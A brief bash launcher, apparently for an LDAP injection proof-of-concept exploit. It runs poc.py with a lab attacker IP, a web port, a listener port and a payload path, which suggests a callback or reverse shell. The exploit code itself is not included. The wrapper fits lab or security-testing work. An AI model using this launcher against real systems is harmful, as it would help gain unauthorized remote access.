#!/bin/bash
# filepath: run-ldap.sh

if [ $# -ne 1 ]; then
    echo "Usage: $0 <payload_path>"
    exit 1
fi

PAYLOAD="$1"
source venv/bin/activate
python3 poc.py --userip 192.168.56.1 --webport 8000 --lport 9001 --payload "$PAYLOAD"